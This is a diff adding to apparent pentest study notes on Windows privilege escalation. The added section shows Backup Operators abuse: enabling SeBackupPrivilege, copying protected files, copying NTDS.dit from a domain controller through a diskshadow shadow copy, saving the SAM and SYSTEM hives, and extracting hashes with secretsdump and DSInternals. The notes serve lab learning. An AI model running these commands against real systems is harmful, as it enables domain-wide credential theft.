@@ -1,6 +1,6 @@
 
 # Windows User Privileges
-
+- [list of User Rights and Privileges](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory#table-b-1-user-rights-and-privileges)
 ## SeImpersonate and SeAssignPrimaryToken
 
 - Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used and gain NT AUTHORITY\SYSTEM level access.
@@ -138,4 +138,82 @@ c:\inetpub\wwwwroot\web.config
 ```
 
 # Windows Group Privileges
+- [listing of all built-in Windows groups](https://ss64.com/nt/syntax-security_groups.html)
 
+## Backup Operators
+-  Membership of this group grants its members the `SeBackup` and `SeRestore` privileges.
+-  The `SeBackupPrivilege` allows us to traverse any folder and list the folder contents. 
+- Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.
+- This group also permits logging in locally to a domain controller. this can be used to copy `NTDS.dit`
+- [poc SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
+
+
+### check
+```powershell
+whoami /priv
+whoami /groups
+
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+# check if SeBackup is enabled of disabled
+Get-SeBackupPrivilege
+
+# enable SeBackup
+Set-SeBackupPrivilege
+```
+
+### Copying a Protected File
+```powershell
+# from `SeBackupPrivilegeCmdLets.dll`
+Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+
+# using robocopy
+robocopy /B 'C:\Confidential\' .\ '2021 Contract.txt'
+```
+
+### Attacking a Domain Controller - Copying NTDS.dit
+```powershell
+# beckup the NTDS.dit from DC
+diskshadow.exe
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+dir E:
+
+
+# copy NTDS.dit file to read it
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+
+# copy NTDS.dit file to read it using robocopy
+robocopy /B E:\Windows\NTDS .\Tools ntds.dit
+```
+
+### Backing up SAM and SYSTEM Registry Hives
+- The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline
+```powershell
+reg save HKLM\SYSTEM SYSTEM.SAV
+
+reg save HKLM\SAM SAM.SAV
+```
+
+### Extracting Credentials
+**Linux**
+```powershell
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+```
+**Windows** 
+```powershell
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
